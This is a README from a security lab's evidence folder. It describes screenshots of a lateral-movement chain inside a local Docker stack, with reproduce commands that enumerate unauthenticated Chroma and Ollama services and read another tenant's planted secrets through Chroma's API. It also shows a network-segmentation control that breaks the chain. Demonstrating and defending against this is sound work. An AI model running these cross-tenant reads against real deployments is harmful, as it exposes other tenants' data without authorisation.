# GUI evidence: lateral movement kill chain

All terminal images in this directory are real captures of real commands run
against the component's own live three-tier stack (`lateral-app`,
`lateral-chroma`, `lateral-ollama`), started fresh with the component's own
`scripts/01-start-stack.sh` and `scripts/02-plant-tenant-data.sh`. Terminal
captures use `wshearer-site/tools/termcap.sh`, which runs the command in a
real qterminal window on the live X display and photographs only that
window, never the desktop. The one diagram (04-) is a generated graphviz
figure, explicitly labeled as a diagram rather than a tool screenshot.
Nothing here is hand-drawn, mocked up, or rendered from HTML/CSS to look
like an application. Every image was read back and visually confirmed
before being kept.

## Images

### 01-foothold-enumeration-no-auth.png
**Tool:** qterminal (via `termcap.sh`), running `docker exec lateral-app`
with a small Python snippet using only libraries already present in the
foothold container.
**Shows:** from inside `lateral-app` (the assumed foothold), a raw TCP
connect check finds both `lateral-chroma:8000` and `lateral-ollama:11434`
open, and a plain `requests.get()` against each service's status endpoint
(`/api/v2/heartbeat` on chroma, `/api/tags` on ollama) returns `200` with no
credentials supplied anywhere. Illustrates `FINDINGS.md` Steps 1-2: every
peer service is reachable and requires no authentication from the foothold.
**Reproduce:**
```
bash scripts/01-start-stack.sh
docker exec lateral-app python3 -c "
import socket
for host, port in [('lateral-chroma', 8000), ('lateral-ollama', 11434)]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
    try:
        s.connect((host, port)); print(f'{host}:{port} -> OPEN')
    except Exception as e:
        print(f'{host}:{port} -> {e}')
"
docker exec lateral-app python3 -c "import requests; print(requests.get('http://lateral-chroma:8000/api/v2/heartbeat').text)"
docker exec lateral-app python3 -c "import requests; print(requests.get('http://lateral-ollama:11434/api/tags').status_code)"
```

### 02-cross-tenant-read-from-foothold.png
**Tool:** qterminal (via `termcap.sh`), same `docker exec lateral-app`
pattern.
**Shows:** three POST requests from inside the foothold to Chroma's
`/get` endpoint, using the foothold's own `default_tenant/default_database`
path with tenant A's collection UUID, then tenant B's collection UUID, then
a completely fabricated tenant/database name paired with tenant B's UUID.
All three return `200` and the real planted secret
(`LATERAL_TENANT_A_SECRET_VALUE_71bd2f`, `LATERAL_TENANT_B_SECRET_VALUE_ae930c`
twice). Illustrates `FINDINGS.md` Step 3: cross-tenant data read from the
foothold, including through a tenant/database path that was never created.
Both secret values are synthetic, planted by
`scripts/02-plant-tenant-data.sh` for this test only.
**Reproduce:**
```
bash scripts/02-plant-tenant-data.sh   # writes evidence/planted-collection-ids.txt
source <(grep COLLECTION_ evidence/planted-collection-ids.txt)
docker exec lateral-app python3 -c "
import requests
r = requests.post('http://lateral-chroma:8000/api/v2/tenants/default_tenant/databases/default_database/collections/$COLLECTION_A_ID/get', json={})
print(r.status_code, r.json())
"
# repeat with $COLLECTION_B_ID, and again with tenants/nonexistent_tenant/databases/nonexistent_db
```

### 03-network-segmentation-blocks-dns.png
**Tool:** qterminal (via `termcap.sh`), running `docker network create` and
`docker run` against a plain `python:3.12-slim` image (no code from the
foothold app is needed for this control test).
**Shows:** a new Docker network, deliberately separate from `lateral-net`,
and a container on it attempting `socket.gethostbyname()` for
`lateral-chroma` and `lateral-ollama`. Both fail with
`Name or service not known` - DNS resolution itself fails before any
credential or application-layer question is even reached. This is the live
reproduction of `FINDINGS.md`'s defensive conclusion: putting each tier on
its own network breaks the entire chain at Step 1.
**Reproduce:**
```
docker network create lateral-control-net-demo
docker run --rm --network lateral-control-net-demo python:3.12-slim python3 -c "
import socket
for host in ['lateral-chroma', 'lateral-ollama']:
    try:
        print(host, '->', socket.gethostbyname(host))
    except Exception as e:
        print(host, '-> DNS FAILED', e)
"
docker network rm lateral-control-net-demo
```

### 04-kill-chain-diagram.png
**Tool:** Graphviz (`dot`), a generated diagram - not a screenshot of any
application or tool. Titled "diagram, not a tool screenshot" in its own
caption.
**Shows:** the five-step chain documented in `FINDINGS.md`'s "The chain"
section: assumed foothold compromise in `lateral-app`; unauthenticated
network reachability to `lateral-chroma` and `lateral-ollama` on the shared
bridge network; cross-tenant secret reads from chroma; full read/write
control (list/infer/pull/delete) on ollama; credential recovery inside the
foothold's own environment. A dashed red edge marks where the documented
defensive control (separate Docker networks, breaking DNS resolution) would
have blocked every step. Every node and edge label is taken directly from
`FINDINGS.md`; nothing in the diagram is invented.
**Reproduce:** the Graphviz DOT source is reproduced below; render with
`dot -Tpng input.dot -o 04-kill-chain-diagram.png`. Node/edge labels are
transcribed from `FINDINGS.md`'s "The chain" ASCII diagram and per-step
sections.

## What was NOT captured

Nothing from the requested scope was skipped. All four target items
(foothold enumeration, cross-tenant read, network-segmentation control, and
the kill-chain diagram) produced real, verified captures.

## Cleanup

The `lateral-control-net-demo` network created for capture 03 was removed
immediately after that capture with `docker network rm`. The main stack
(`lateral-app`, `lateral-chroma`, `lateral-ollama`, `lateral-net`) was
stopped and removed at the end of the full capture pass with
`scripts/99-cleanup.sh`, confirmed empty afterward (`docker ps -a` and
`docker network ls` both show no `lateral-*` resources remaining).
